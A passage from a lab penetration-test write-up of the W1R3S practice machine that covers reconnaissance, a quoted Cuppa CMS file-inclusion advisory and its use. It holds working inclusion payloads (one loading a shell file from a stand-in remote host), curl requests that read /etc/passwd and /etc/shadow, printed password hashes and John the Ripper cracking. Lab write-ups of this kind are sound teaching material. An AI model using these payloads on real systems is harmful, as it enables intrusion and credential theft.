</span><span class='line'>|      Connected to ::ffff:192.168.145.130
</span><span class='line'>|      Logged in as ftp
</span><span class='line'>|      TYPE: ASCII
</span><span class='line'>|      No session bandwidth limit
</span><span class='line'>|      Session timeout in seconds is 300
</span><span class='line'>|      Control connection is plain text
</span><span class='line'>|      Data connections will be plain text
</span><span class='line'>|      At session startup, client count was 1
</span><span class='line'>|      vsFTPd 3.0.3 - secure, fast, stable
</span><span class='line'>|_End of status
</span><span class='line'>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
</span><span class='line'>| ssh-hostkey:
</span><span class='line'>|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
</span><span class='line'>|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
</span><span class='line'>|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
</span><span class='line'>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|_http-title: Apache2 Ubuntu Default Page: It works
</span><span class='line'>3306/tcp open  mysql   MySQL (unauthorized)</span></code></pre></td></tr></table></div></figure>


<p>The immediate points of interest are the FTP server, and the web server. Since Nmap only found the Apache default page, I started some background enumeration with Gobuster:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gobuster -u http://192.168.145.134 -w /usr/share/wordlists/dirb/common.txt
</span><span class='line'>
</span><span class='line'>=====================================================
</span><span class='line'>Gobuster v2.0.0              OJ Reeves (@TheColonial)
</span><span class='line'>=====================================================
</span><span class='line'>[+] Mode         : dir
</span><span class='line'>[+] Url/Domain   : http://192.168.145.134/
</span><span class='line'>[+] Threads      : 10
</span><span class='line'>[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
</span><span class='line'>[+] Status codes : 200,204,301,302,307,403
</span><span class='line'>[+] Timeout      : 10s
</span><span class='line'>=====================================================
</span><span class='line'>2018/11/30 05:46:49 Starting gobuster
</span><span class='line'>=====================================================
</span><span class='line'>/.hta (Status: 403)
</span><span class='line'>/.htaccess (Status: 403)
</span><span class='line'>/.htpasswd (Status: 403)
</span><span class='line'>/administrator (Status: 301)
</span><span class='line'>/index.html (Status: 200)
</span><span class='line'>/javascript (Status: 301)
</span><span class='line'>/server-status (Status: 403)
</span><span class='line'>/wordpress (Status: 301)
</span><span class='line'>=====================================================</span></code></pre></td></tr></table></div></figure>


<p>Ok, we have some web directories to check..a possible Wordpress installation, a MySQL database and an FTP server that we can login to.</p>

<h2>Phase 3: TARGET ID</h2>

<p>Logging in to the FTP server, we see the following directories:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>150 Here comes the directory listing.
</span><span class='line'>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
</span><span class='line'>drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
</span><span class='line'>drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span></code></pre></td></tr></table></div></figure>


<p>I downloaded them to my machine with <code>wget -r <a href="ftp://ftp:anonymous@192.168.145.134/">ftp://ftp:anonymous@192.168.145.134/</a></code>. Inside the <em>content</em> folder there are 3 text files, and one of them contains potentially interesting data:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@onosendai:~/target/192.168.145.134/content# ls -alh
</span><span class='line'>total 20K
</span><span class='line'>drwxr-xr-x 2 root root 4.0K Nov 30 06:16 .
</span><span class='line'>drwxr-xr-x 5 root root 4.0K Nov 30 06:16 ..
</span><span class='line'>-rw-r--r-- 1 root root   29 Jan 23  2018 01.txt
</span><span class='line'>-rw-r--r-- 1 root root  165 Jan 23  2018 02.txt
</span><span class='line'>-rw-r--r-- 1 root root  582 Jan 23  2018 03.txt
</span><span class='line'>root@onosendai:~/target/192.168.145.134/content# cat 01.txt
</span><span class='line'>New FTP Server For W1R3S.inc
</span><span class='line'>root@onosendai:~/target/192.168.145.134/content# cat 02.txt
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>01ec2d8fc11c493b25029fb1f47f39ce
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>#
</span><span class='line'>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
</span><span class='line'>############################################
</span><span class='line'>root@onosendai:~/target/192.168.145.134/content# cat 03.txt
</span><span class='line'>___________.__              __      __  ______________________   _________    .__               
</span><span class='line'>\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____  
</span><span class='line'>  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  &lt; \_____  \     |  |/    \_/ ___\
</span><span class='line'>  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___
</span><span class='line'>  |____|   |___|  /\___  &gt;   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  &gt;
</span><span class='line'>                \/     \/         \/                \/       \/        \/  \/         \/     \/</span></code></pre></td></tr></table></div></figure>


<p>I used an online MD5 hash cracker to get the value <code>This is not a password</code>. And the base64 string gave the message that <code>It is easy, but not that easy..</code>. So there are probably red herrings, let&rsquo;s move on.</p>

<p>Inside <em>docs</em> there&rsquo;s a text file with some upside down text:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@onosendai:~/target/192.168.145.134/docs# cat worktodo.txt
</span><span class='line'>  ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡
</span><span class='line'>
</span><span class='line'>....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ</span></code></pre></td></tr></table></div></figure>


<p>Used an <a href="http://flip-upsidedown-text.1bestlink.net/">online converter</a> to flip this and reverse it for the text:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>we have a ןot of work to do‘ stop pןaying around˙˙˙˙
</span><span class='line'>i don't think this is the way to root!</span></code></pre></td></tr></table></div></figure>


<p>This is also useless..The final piece gives us some names that we might be able to use later:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@onosendai:~/target/192.168.145.134/new-employees# cat employee-names.txt
</span><span class='line'>The W1R3S.inc employee list
</span><span class='line'>
</span><span class='line'>Naomi.W - Manager
</span><span class='line'>Hector.A - IT Dept
</span><span class='line'>Joseph.G - Web Design
</span><span class='line'>Albert.O - Web Design
</span><span class='line'>Gina.L - Inventory
</span><span class='line'>Rico.D - Human Resources</span></code></pre></td></tr></table></div></figure>


<p>This is all the information we got from the FTP vector. Let&rsquo;s return to the web server now. The javascript folder was forbidden for viewing, and the wordpress folder redirected to localhost/wordpress, so I had to modify my <code>/etc/hosts</code> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.145.134 localhost</span></code></pre></td></tr></table></div></figure>


<p>Now I could get to the Wordpress blog, which looks to be under construction:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/w1r3s/wordpress.png" title="wordpress" alt="wordpress"></p>

<p>I decided to go with an alternate Wordpress scanner for this one, so instead of WPScan, I went with <a href="https://github.com/m4ll0k/WPSeku">WPSeku</a></p>

<blockquote><p>WPSeku &ndash; Wordpress Security Scanner</p>

<p>WPSeku is a black box WordPress vulnerability scanner that can be used to scan remote WordPress installations to find security issues.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python3 wpseku.py
</span><span class='line'>----------------------------------------
</span><span class='line'> _ _ _ ___ ___ ___| |_ _ _
</span><span class='line'>| | | | . |_ -| -_| '_| | |
</span><span class='line'>|_____|  _|___|___|_,_|___|
</span><span class='line'>      |_|             v0.4.0
</span><span class='line'>
</span><span class='line'>WPSeku - Wordpress Security Scanner
</span><span class='line'>by Momo Outaadi (m4ll0k)
</span><span class='line'>----------------------------------------
</span><span class='line'>
</span><span class='line'>Usage: wpseku.py [options]
</span><span class='line'>
</span><span class='line'>  -u --url    Target URL (e.g: http://site.com)
</span><span class='line'>  -b --brute  Bruteforce login via xmlrpc
</span><span class='line'>  -U --user   Set username for bruteforce, default "admin"
</span><span class='line'>  -s --scan   Checking wordpress plugin code
</span><span class='line'>  -p --proxy  Use a proxy, (host:port)
</span><span class='line'>  -c --cookie Set HTTP Cookie header value
</span><span class='line'>  -a --agent  Set HTTP User-agent header value
</span><span class='line'>  -r --ragent Use random User-agent header value
</span><span class='line'>  -R --redirect   Set redirect target URL False
</span><span class='line'>  -t --timeout    Seconds to wait before timeout connection
</span><span class='line'>  -w --wordlist   Set wordlist, default "db/wordlist.txt"
</span><span class='line'>  -v --verbose    Print more informations
</span><span class='line'>  -h --help   Show this help and exit
</span><span class='line'>
</span><span class='line'>Example:
</span><span class='line'>   wpseku.py --url http://site.com/
</span><span class='line'>   wpseku.py --url http://site.com --brute --user test
</span><span class='line'>   wpseku.py --url http://site.com/ --brute --user admin --wordlist wordlist.txt</span></code></pre></td></tr></table></div></figure>


<p>Ran it against the target:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python3 wpseku.py -u http://localhost/wordpress/ -v
</span><span class='line'>----------------------------------------
</span><span class='line'> _ _ _ ___ ___ ___| |_ _ _
</span><span class='line'>| | | | . |_ -| -_| '_| | |
</span><span class='line'>|_____|  _|___|___|_,_|___|
</span><span class='line'>      |_|             v0.4.0
</span><span class='line'>
</span><span class='line'>WPSeku - Wordpress Security Scanner
</span><span class='line'>by Momo Outaadi (m4ll0k)
</span><span class='line'>----------------------------------------
</span><span class='line'>
</span><span class='line'>[ + ] Target: http://localhost/wordpress/
</span><span class='line'>[ + ] Starting: 07:52:06
</span><span class='line'>
</span><span class='line'>[ + ] Server: Apache/2.4.18 (Ubuntu)
</span><span class='line'>[ i ] Checking Full Path Disclosure...
</span><span class='line'>[ i ] Checking wp-config backup file...
</span><span class='line'>[ + ] wp-config.php available at: http://localhost/wordpress/wp-config.php
</span><span class='line'>[ i ] Checking common files...
</span><span class='line'>[ + ] readme.html file was found at: http://localhost/wordpress/readme.html
</span><span class='line'>[ i ] Checking directory listing...
</span><span class='line'>[ + ] Dir "/wp-admin/css" listing enable at: http://localhost/wordpress/wp-admin/css/
</span><span class='line'>[ + ] Dir "/wp-admin/images" listing enable at: http://localhost/wordpress/wp-admin/images/
</span><span class='line'>[ + ] Dir "/wp-admin/includes" listing enable at: http://localhost/wordpress/wp-admin/includes/
</span><span class='line'>[ + ] Dir "/wp-admin/js" listing enable at: http://localhost/wordpress/wp-admin/js/
</span><span class='line'>[ + ] Dir "/wp-content/uploads" listing enable at: http://localhost/wordpress/wp-content/uploads/
</span><span class='line'>[ + ] Dir "/wp-includes/" listing enable at: http://localhost/wordpress/wp-includes/
</span><span class='line'>[ + ] Dir "/wp-includes/js" listing enable at: http://localhost/wordpress/wp-includes/js/
</span><span class='line'>[ + ] Dir "/wp-includes/Text" listing enable at: http://localhost/wordpress/wp-includes/Text/
</span><span class='line'>[ + ] Dir "/wp-includes/css" listing enable at: http://localhost/wordpress/wp-includes/css/
</span><span class='line'>[ + ] Dir "/wp-includes/images" listing enable at: http://localhost/wordpress/wp-includes/images/
</span><span class='line'>[ + ] Dir "/wp-includes/pomo" listing enable at: http://localhost/wordpress/wp-includes/pomo/
</span><span class='line'>[ + ] Dir "/wp-includes/theme-compat" listing enable at: http://localhost/wordpress/wp-includes/theme-compat/
</span><span class='line'>[ i ] Checking wp-loging protection...
</span><span class='line'>[ i ] Checking robots paths...
</span><span class='line'>[ i ] Checking WordPress version...
</span><span class='line'>[ + ] Running WordPress version: 4.9.8
</span><span class='line'>  |   Not found vulnerabilities
</span><span class='line'>
</span><span class='line'>[ i ] Passive enumeration themes...
</span><span class='line'>[ + ] Name: twentyseventeen
</span><span class='line'>[ i ] Checking themes changelog...
</span><span class='line'>[ i ] Checking themes full path disclosure...
</span><span class='line'>[ i ] Checking themes license...
</span><span class='line'>[ i ] Checking themes readme...
</span><span class='line'>[ i ] Checking themes directory listing...
</span><span class='line'>[ i ] Checking theme vulnerabilities...
</span><span class='line'>  |   Not found vulnerabilities
</span><span class='line'>
</span><span class='line'>[ i ] Passive enumeration plugins...
</span><span class='line'>[ + ] Not found plugins with passive enumeration
</span><span class='line'>[ i ] Enumerating users...
</span><span class='line'>----------------------------
</span><span class='line'>| ID | Username | Login    |
</span><span class='line'>----------------------------
</span><span class='line'>|  0 | Admin    | admin    |
</span><span class='line'>|  1 | Admin    | None     |
</span><span class='line'>|  2 |          | admin    |
</span><span class='line'>|  3 |          | joseph-g |
</span><span class='line'>----------------------------</span></code></pre></td></tr></table></div></figure>


<p>Nothing evidently exploitable in the scan results, so I turned to the <em>/administrator</em> folder on the web server and got to the configuration screen of a Cuppa CMS:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/w1r3s/cuppa-cms.png" title="cuppa cms" alt="cuppa cms"></p>

<p>Couldn&rsquo;t proceed with the configuration because I didn&rsquo;t have enough information:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/w1r3s/cuppa-admin.png" title="cuppa admin" alt="cuppa admin"></p>

<p>I&rsquo;ve never heard of this CMS before, I ran a quick searchsploit and got a hit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>searchsploit cuppa cms
</span><span class='line'>------------------------------------------------------------------------------------------------------------ ----------------------------------------
</span><span class='line'> Exploit Title                                                                                              |  Path
</span><span class='line'>                                                                                                            | (/usr/share/exploitdb/)
</span><span class='line'>------------------------------------------------------------------------------------------------------------ ----------------------------------------
</span><span class='line'>Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion                                             | exploits/php/webapps/25971.txt
</span><span class='line'>------------------------------------------------------------------------------------------------------------ ----------------------------------------</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s see what this is about:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>####################################
</span><span class='line'>
</span><span class='line'>VULNERABILITY: PHP CODE INJECTION
</span><span class='line'>
</span><span class='line'>####################################
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>/alerts/alertConfigField.php (LINE: 22)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>-----------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>LINE 22:
</span><span class='line'>
</span><span class='line'>        &lt;?php include($_REQUEST["urlConfig"]); ?&gt;
</span><span class='line'>
</span><span class='line'>-----------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#####################################################
</span><span class='line'>
</span><span class='line'>DESCRIPTION
</span><span class='line'>
</span><span class='line'>#####################################################
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#####################################################
</span><span class='line'>
</span><span class='line'>EXPLOIT
</span><span class='line'>
</span><span class='line'>#####################################################
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
</span><span class='line'>
</span><span class='line'>http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Moreover, We could access Configuration.php source code via PHPStream
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>For Example:
</span><span class='line'>
</span><span class='line'>-----------------------------------------------------------------------------
</span><span class='line'>
</span><span class='line'>http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
</span><span class='line'>
</span><span class='line'>-----------------------------------------------------------------------------
</span></code></pre></td></tr></table></div></figure>


<h2>Phase 4: LIVE RUN</h2>

<p>I tried the LFI, but all I got was a blank page in return. So I attempted this with curl, and got served the <em>passwd</em> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl http://192.168.145.134/administrator/alerts/alertConfigField.php --data-urlencode urlConfig=../../../../../../../../../etc/passwd
</span><span class='line'>[...]
</span><span class='line'>w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<p>Now we have a valid user on the system and we can read arbitrary files. Because the root user was prepopulated in the installation page, I tried reading the <em>/etc/shadow</em> file and&hellip;succeeded!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
</span><span class='line'>www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
</span><span class='line'>w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span></code></pre></td></tr></table></div></figure>


<p>That was a lucky break! I put the hashes for root and w1r3s in a file to be cracked by John the Ripper and immediately got a password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>john hashes.txt
</span><span class='line'>Created directory: /root/.john
</span><span class='line'>Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
</span><span class='line'>Use the "--format=crypt" option to force loading these as that type instead
</span><span class='line'>Using default input encoding: UTF-8
</span><span class='line'>Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
</span><span class='line'>Press 'q' or Ctrl-C to abort, almost any other key for status
</span><span class='line'>computer         (w1r3s)</span></code></pre></td></tr></table></div></figure>


<p>With this, I could SSH in.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh w1r3s@192.168.145.134
</span><span class='line'>The authenticity of host '192.168.145.134 (192.168.145.134)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:/3N0PzPMqtXlj9QWJFMbCufh2W95JylZ/oF82NkAAto.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '192.168.145.134' (ECDSA) to the list of known hosts.
</span><span class='line'>----------------------
</span><span class='line'>Think this is the way?
</span><span class='line'>----------------------
</span><span class='line'>Well,........possibly.
</span><span class='line'>----------------------
</span><span class='line'>w1r3s@192.168.145.134's password:
</span><span class='line'>Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com
</span><span class='line'> * Management:     https://landscape.canonical.com
</span><span class='line'> * Support:        https://ubuntu.com/advantage
</span><span class='line'>
</span><span class='line'>227 packages can be updated.
</span><span class='line'>11 updates are security updates.
</span><span class='line'>
</span><span class='line'>*** System restart required ***
</span><span class='line'>.....You made it huh?....
</span><span class='line'>Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span></code></pre></td></tr></table></div></figure>


<p>One of the things I picked up from watching <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">Ippsec</a> videos was to check the sudo privileges early on:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -l
</span><span class='line'>sudo: unable to resolve host W1R3S
</span><span class='line'>[sudo] password for w1r3s:
</span><span class='line'>Matching Defaults entries for w1r3s on W1R3S:
